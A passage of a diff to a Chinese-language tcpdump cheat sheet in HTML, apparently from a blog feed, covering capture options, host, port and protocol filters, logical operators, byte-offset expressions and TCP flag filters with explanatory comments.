+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i &lt;INTERFACE&gt;</span><br><span class="line">tcpdump -i eth0</span><br><span class="line"><span class="comment"># &lt;INTERFACE&gt;: eth0, wlo1, any</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line">tcpdump -w &lt;FILE&gt;</span><br><span class="line">tcpdump -w file.pcap</span><br><span class="line"><span class="comment"># &lt;FILE&gt;: .pcap 文件名</span></span><br><span class="line"><span class="comment"># 将捕获的数据包写入 file.pcap</span></span><br><span class="line"></span><br><span class="line">tcpdump -c &lt;COUNT&gt;</span><br><span class="line">tcpdump -c 1</span><br><span class="line"><span class="comment"># &lt;COUNT&gt;: 1/2/3...</span></span><br><span class="line"><span class="comment"># 捕获 1 个数量的数据包</span></span><br><span class="line"></span><br><span class="line">tcpdump host &lt;IP&gt;/&lt;HOSTNAME&gt;</span><br><span class="line"><span class="comment"># tcpdump host 192.0.2.1</span></span><br><span class="line"><span class="comment"># &lt;IP&gt;/&lt;HOSTNAME&gt;: 192.0.2.1/example.com...</span></span><br><span class="line"></span><br><span class="line">tcpdump port &lt;PORT_NUMBER&gt;</span><br><span class="line">tcpdump port 80</span><br><span class="line"><span class="comment"># &lt;PORT_NUMBER&gt;: 53/22/80/443...</span></span><br><span class="line"><span class="comment"># 按 80 d过滤数据包</span></span><br><span class="line"></span><br><span class="line">tcpdump &lt;PROTOCOL&gt;</span><br><span class="line">tcpdump ip</span><br><span class="line"><span class="comment"># &lt;PROTOCOL&gt;: ip, ip6, udp, tcp, icmp</span></span><br><span class="line"><span class="comment"># 按 ip 协议过滤数据包</span></span><br></pre></td></tr></table></figure>
 
-
-<table>
+<h3 id="tcpdump-逻辑操作符"><a href="#tcpdump-逻辑操作符" class="headerlink" title="tcpdump 逻辑操作符"></a>tcpdump 逻辑操作符</h3><table>
 <thead>
 <tr>
 <th>逻辑操作符</th>
@@ -1629,9 +1643,7 @@
 <td>捕获不满足条件的数据包</td>
 </tr>
 </tbody></table>
-<br>
-
-<table>
+<h3 id="tcpdump-关键字"><a href="#tcpdump-关键字" class="headerlink" title="tcpdump 关键字"></a>tcpdump 关键字</h3><table>
 <thead>
 <tr>
 <th>关键字</th>
@@ -1647,9 +1659,9 @@
 <td>过滤长度小于或等于指定长度（以字节为单位）的数据包</td>
 </tr>
 </tbody></table>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">greater &lt;LENGTH&gt;</span><br><span class="line"><span class="comment"># &lt;LENGTH&gt;: 1000/2500/5000...</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">greater &lt;LENGTH&gt;</span><br><span class="line">greater 1000</span><br><span class="line"><span class="comment"># &lt;LENGTH&gt;: 1000/2500/5000...</span></span><br></pre></td></tr></table></figure>
 
-<table>
+<h3 id="tcpdump-表达式"><a href="#tcpdump-表达式" class="headerlink" title="tcpdump 表达式"></a>tcpdump 表达式</h3><table>
 <thead>
 <tr>
 <th>表达式</th>
@@ -1667,7 +1679,7 @@
 </tbody></table>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proto[<span class="built_in">expr</span>:size]</span><br><span class="line"><span class="comment"># proto（协议）: 例如 arp、ether、icmp、ip、ip6、tcp、udp   </span></span><br><span class="line"><span class="comment"># expr（字节偏移量）: 表示从协议头部第几个字节开始，0 表示第一个字节</span></span><br><span class="line"><span class="comment"># size（字节数）: 表示读取的字节长度，支持值为 1、2 或 4，默认为 1</span></span><br><span class="line"></span><br><span class="line">tcp[tcpflags]</span><br><span class="line"><span class="comment"># tcp-syn（同步）: 发起连接的第一个数据包</span></span><br><span class="line"><span class="comment"># tcp-ack（确认）: 确认收到数据</span></span><br><span class="line"><span class="comment"># tcp-fin（完成）: 连接关闭请求</span></span><br><span class="line"><span class="comment"># tcp-rst（重置）: 强制关闭连接</span></span><br><span class="line"><span class="comment"># tcp-push: 请求立即传输数据</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -c 50 -v</span><br><span class="line"><span class="comment"># 通过监听接口 eth0（有线以太网）捕获并显示 50 个数据包，以详细方式显示。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i wlo1 -w data.pcap</span><br><span class="line"><span class="comment"># 通过监听接口 wlo1（WiFi 接口）捕获数据包，并将数据包写入 data.pcap。它会一直运行，直到按下 Ctrl + C 中断捕获。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i any -nn</span><br><span class="line"><span class="comment"># 捕获所有接口上的数据包并将其显示在屏幕上，不解析 IP 地址，不解析协议 </span></span><br><span class="line"></span><br><span class="line">tcpdump -i any tcp port 22</span><br><span class="line"><span class="comment"># 监听所有接口并捕获tcp往返的数据包 22 端口，即SSH流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i wlo1 udp port 123</span><br><span class="line"><span class="comment"># 监听 WiFi 网卡并过滤发往网络时间协议 (NTPudp) 123 端口的流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i eth0 host example.com and tcp port 443 -w https.pcap</span><br><span class="line"><span class="comment"># 将监听 eth0 有线以太网接口，并过滤与 example.com 相关，使用 tcp 的 443 端口的 HTTPS 流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump host 1.1.1.1 and tcp</span><br><span class="line"><span class="comment"># 捕获tcp带有 的流量host 1.1.1.1。</span></span><br><span class="line"></span><br><span class="line">tcpdump udp or icmp</span><br><span class="line"><span class="comment"># 捕获UDP或 ICMP 流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump not tcp</span><br><span class="line"><span class="comment"># 捕获除TCP段之外的所有数据包；我们预期在结果中找到UDP、ICMP 和ARP数据包。</span></span><br><span class="line"></span><br><span class="line">ether[0] &amp; 1 != 0</span><br><span class="line"><span class="comment"># 取 ether 以太网报头中的第一个字节（也就是目标 MAC 地址的第一个字节），并使用二进制运算符 &amp; (与)，和十进制 1（二进制表示00000001）进行运算</span></span><br><span class="line"><span class="comment"># 如果结果不等于十进制 0（二进制表示00000000），则返回 true，这个表达式和 ether[0] &amp; 1 == 1 目的一样</span></span><br><span class="line"><span class="comment"># 此过滤器的目的是显示发送到多播地址的数据包。多播以太网地址是一种特定的地址，用于标识一组旨在接收相同数据的设备。结果 1 表示多播，0表示单播</span></span><br><span class="line"></span><br><span class="line">ip[0] &amp; 0xf != 5</span><br><span class="line"><span class="comment"># 取 IP 头中的第一个字节的低 4 位（也就是 IP Header Length 字段），并使用二进制运算符 &amp; (与)，与十六进制数 F（二进制 00001111）进行比较。</span></span><br><span class="line"><span class="comment"># 如果结果不等于十进制 5（二进制表示 00000101），则返回 true。</span></span><br><span class="line"><span class="comment"># 此过滤器的目的是捕获所有带有选项的 IP 数据包。</span></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] == tcp-syn&quot;</span></span><br><span class="line"><span class="comment"># 捕获仅设置了 SYN（同步）标志，而所有其他标志均未设置的 TCP 数据包。</span></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] &amp; tcp-syn != 0&quot;</span></span><br><span class="line"><span class="comment"># 捕获至少设置了 SYN（同步）标志的TCP数据包。</span></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] &amp; (tcp-syn|tcp-ack) != 0&quot;</span></span><br><span class="line"><span class="comment">#捕获至少设置了SYN（同步）或ACK（确认）标志的TCP数据包。</span></span><br></pre></td></tr></table></figure>
+<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth0 -c 50 -v</span><br><span class="line"><span class="comment"># 通过监听接口 eth0（有线以太网）捕获并显示 50 个数据包，以详细方式显示。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i wlo1 -w data.pcap</span><br><span class="line"><span class="comment"># 通过监听接口 wlo1（WiFi 接口）捕获数据包，并将数据包写入 data.pcap。它会一直运行，直到按下 Ctrl + C 中断捕获。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i any -nn</span><br><span class="line"><span class="comment"># 捕获所有接口上的数据包并将其显示在屏幕上，不解析 IP 地址，不解析协议 </span></span><br><span class="line"></span><br><span class="line">tcpdump -i any tcp port 22</span><br><span class="line"><span class="comment"># 监听所有接口并捕获tcp往返的数据包 22 端口，即SSH流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i wlo1 udp port 123</span><br><span class="line"><span class="comment"># 监听 WiFi 网卡并过滤发往网络时间协议 (NTPudp) 123 端口的流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump -i eth0 host example.com and tcp port 443 -w https.pcap</span><br><span class="line"><span class="comment"># 将监听 eth0 有线以太网接口，并过滤与 example.com 相关，使用 tcp 的 443 端口的 HTTPS 流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump host 1.1.1.1 and tcp</span><br><span class="line"><span class="comment"># 捕获tcp带有 的流量host 1.1.1.1。</span></span><br><span class="line"></span><br><span class="line">tcpdump udp or icmp</span><br><span class="line"><span class="comment"># 捕获UDP或 ICMP 流量。</span></span><br><span class="line"></span><br><span class="line">tcpdump not tcp</span><br><span class="line"><span class="comment"># 捕获除TCP段之外的所有数据包；我们预期在结果中找到UDP、ICMP 和ARP数据包。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> tcpdump -i eth0 -n <span class="string">&#x27;ether[0] &amp; 1 != 0&#x27;</span></span><br><span class="line"><span class="comment"># 取 ether 以太网报头中的第一个字节（也就是目标 MAC 地址的第一个字节），并使用二进制运算符 &amp; (与)，和十进制 1（二进制表示00000001）进行运算。如果结果不等于十进制 0（二进制表示00000000），则返回 true，这个表达式和 ether[0] &amp; 1 == 1 目的一样。此过滤器的目的是显示发送到多播地址的数据包。多播以太网地址是一种特定的地址，用于标识一组旨在接收相同数据的设备。结果 1 表示多播，0表示单播</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">sudo</span> tcpdump -i eth0 -n <span class="string">&#x27;ip[0] &amp; 0xf != 5&#x27;</span></span><br><span class="line"><span class="comment"># 取 IP 头中的第一个字节的低 4 位（也就是 IP Header Length 字段），并使用二进制运算符 &amp; (与)，与十六进制数 F（二进制 00001111）进行比较。如果结果不等于十进制 5（二进制表示 00000101），则返回 true。此过滤器的目的是捕获所有带有选项的 IP 数据包。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] == tcp-syn&quot;</span></span><br><span class="line"><span class="comment"># 捕获仅设置了 SYN（同步）标志，而所有其他标志均未设置的 TCP 数据包。</span></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] &amp; tcp-syn != 0&quot;</span></span><br><span class="line"><span class="comment"># 捕获至少设置了 SYN（同步）标志的TCP数据包。</span></span><br><span class="line"></span><br><span class="line">tcpdump <span class="string">&quot;tcp[tcpflags] &amp; (tcp-syn|tcp-ack) != 0&quot;</span></span><br><span class="line"><span class="comment">#捕获至少设置了SYN（同步）或ACK（确认）标志的TCP数据包。</span></span><br></pre></td></tr></table></figure>
 <br>
 
 ]]></content>
